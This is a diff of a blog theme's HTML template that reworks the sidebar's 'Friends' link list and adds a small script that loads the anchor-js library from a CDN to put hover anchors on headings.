+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+
         <!-- Friends Blog -->
-
-<h5><a href="/">FRIENDS</a></h5>
-<ul class="list-inline">
-  
-  <li><a href="https://ciyuxionly.github.io" target="_blank">ZLX</a></li>
-  
-</ul>
-
-
+        
         <hr>
-    
-</div>
+        <h5>FRIENDS</h5>
+        <ul class="list-inline">
 
-
-    
+          
+          <li>
+            <a href="https://ciyuxionly.github.io" target="_blank">ZLX</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
   </div>
-</div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
